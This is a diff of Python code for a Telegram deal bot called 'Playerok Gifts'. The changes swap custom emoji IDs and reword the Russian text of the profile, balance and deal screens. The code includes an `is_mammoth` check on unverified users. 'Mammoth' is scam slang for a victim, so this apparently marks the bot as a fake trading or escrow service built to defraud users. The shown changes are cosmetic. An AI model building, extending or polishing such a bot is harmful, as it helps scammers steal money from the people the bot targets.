@@ -921,22 +921,22 @@ def show_user_profile(user_id, chat_id, message_id=None):
 
     username_display = f"@{user['username']}" if user['username'] != str(user_id) else str(user_id)
 
-    profile_text = f"""<b><tg-emoji emoji-id='5893376775781617954'>🏆</tg-emoji> ПРОФИЛЬ Playerok Bot</b>
+    profile_text = f"""<b><tg-emoji emoji-id='5422413610112549614'>🏆</tg-emoji> Профиль Playerok Gifts</b>
 
-<tg-emoji emoji-id='6032693626394382504'>👤</tg-emoji> <b>Имя:</b> {username_display}
-<tg-emoji emoji-id='6028338546736107668'>⭐️</tg-emoji> <b>Рейтинг:</b> {user['rating']}/5.0
-<tg-emoji emoji-id='5902002809573740949'>✅</tg-emoji> <b>Успешных сделок:</b> {user['success_deals']} <b>Споров выиграно:</b> {user['disputes_won']}
-<tg-emoji emoji-id='5895444149699612825'>📊</tg-emoji> <b>Активных сделок:</b> {len(active_deals)}
+<tg-emoji emoji-id='5258192778180984895'>👤</tg-emoji> <b>Имя:</b> {username_display}
+<tg-emoji emoji-id='5404419114481507025'>⭐️</tg-emoji> <b>Рейтинг:</b> {user['rating']}/5.0
+<tg-emoji emoji-id='5420380845041025879'>✅</tg-emoji> <b>Успешных сделок:</b> {user['success_deals']} <b>Споров выиграно:</b> {user['disputes_won']}
+<tg-emoji emoji-id='5285041795569329475'>📊</tg-emoji> <b>Активных сделок:</b> {len(active_deals)}
 
-<b><tg-emoji emoji-id='5893473283696759404'>💰</tg-emoji> Баланс:</b>
-• <tg-emoji emoji-id='5350716797622442220'>🤑</tg-emoji> Ton: {user['balance']['TON']}
-• 🇷🇺 Rub: {user['balance']['RUB']}
-• 🇺🇸 Usd: {user['balance']['USD']}
-• 🇰🇿 Kzt: {user['balance']['KZT']}
-• 🇺🇦 Uah: {user['balance']['UAH']}
-• 🇧🇾 Byn: {user['balance']['BYN']}
-• <tg-emoji emoji-id='5201692367437974073'>💎</tg-emoji> Usdt: {user['balance']['USDT']}
-• <tg-emoji emoji-id='6028338546736107668'>⭐️</tg-emoji> Stars: {user['balance']['STARS']}"""
+<b><tg-emoji emoji-id='5402426498764280452'>💰</tg-emoji> Баланс:</b>
+• <tg-emoji emoji-id='5280908091410389246'>🤑</tg-emoji> Ton: {user['balance']['TON']}
+• <tg-emoji emoji-id='5415673019718714238'>🤑</tg-emoji> Rub: {user['balance']['RUB']}
+• <tg-emoji emoji-id='5415673019718714238'>🤑</tg-emoji> Usd: {user['balance']['USD']}
+• <tg-emoji emoji-id='5415673019718714238'>🤑</tg-emoji> Kzt: {user['balance']['KZT']}
+• <tg-emoji emoji-id='5415673019718714238'>🤑</tg-emoji> Uah: {user['balance']['UAH']}
+• <tg-emoji emoji-id='5415673019718714238'>🇧🇾</tg-emoji> Byn: {user['balance']['BYN']}
+• <tg-emoji emoji-id='5222409116420433319'>💎</tg-emoji> Usdt: {user['balance']['USDT']}
+• <tg-emoji emoji-id='5467515585673842012'>⭐️</tg-emoji> Stars: {user['balance']['STARS']}"""
 
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
@@ -944,7 +944,7 @@ def show_user_profile(user_id, chat_id, message_id=None):
         InlineKeyboardButton("📦 Мои сделки", callback_data='my_deals')
     )
     keyboard.add(
-        PremiumButton("💰 Баланс и реквизиты", '💰', '5902056028513505203', callback_data='balance_and_requisites')
+        PremiumButton("💰 Баланс и реквизиты", '💰', '5415673019718714238', callback_data='balance_and_requisites')
     )
 
     if is_mammoth(user_id) and not is_user_verified(user_id):
@@ -972,11 +972,11 @@ def show_user_deals(user_id, chat_id, message_id=None):
             user_deals.append((deal_id, deal))
 
     if not user_deals:
-        deals_text = "📭 <b>У ВАС ПОКА НЕТ АКТИВНЫХ СДЕЛОК</b>\n\n"
+        deals_text = "📭 <b>У вас нету активных сделок</b>\n\n"
         deals_text += "Создайте свою первую сделку с помощью кнопки ниже!"
 
         keyboard = InlineKeyboardMarkup(row_width=1)
-        keyboard.add(PremiumButton("⚡ Создать сделку", '⚡', '5773677501825945508', callback_data='warning_show'))
+        keyboard.add(PremiumButton("⚡ Создать сделку", '⚡', '5285041795569329475', callback_data='warning_show'))
         keyboard.add(InlineKeyboardButton(_t(user_id, 'btn_back_menu'), callback_data='main_menu'))
 
         if message_id:
@@ -1018,7 +1018,7 @@ def show_user_deals(user_id, chat_id, message_id=None):
     for i, (deal_id, deal) in enumerate(user_deals[:3], 1):
         keyboard.add(InlineKeyboardButton(f"📄 Сделка #{deal_id[:8]}", callback_data=f'view_deal_{deal_id}'))
 
-    keyboard.add(PremiumButton("⚡ Новая сделка", '⚡', '5773677501825945508', callback_data='warning_show'))
+    keyboard.add(PremiumButton("⚡ Новая сделка", '⚡', '5285041795569329475', callback_data='warning_show'))
     keyboard.add(InlineKeyboardButton(_t(user_id, 'btn_back_menu'), callback_data='main_menu'))
 
     if message_id:
@@ -1050,7 +1050,7 @@ def show_stats_public(user_id, chat_id, message_id=None):
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
         PremiumButton("👤 Мой профиль", '👤', '6041705726206808304', callback_data='my_profile'),
-        PremiumButton("⚡ Создать сделку", '⚡', '5773677501825945508', callback_data='warning_show')
+        PremiumButton("⚡ Создать сделку", '⚡', '5285041795569329475', callback_data='warning_show')
     )
     keyboard.add(InlineKeyboardButton(_t(user_id, 'btn_back_menu'), callback_data='main_menu'))
 
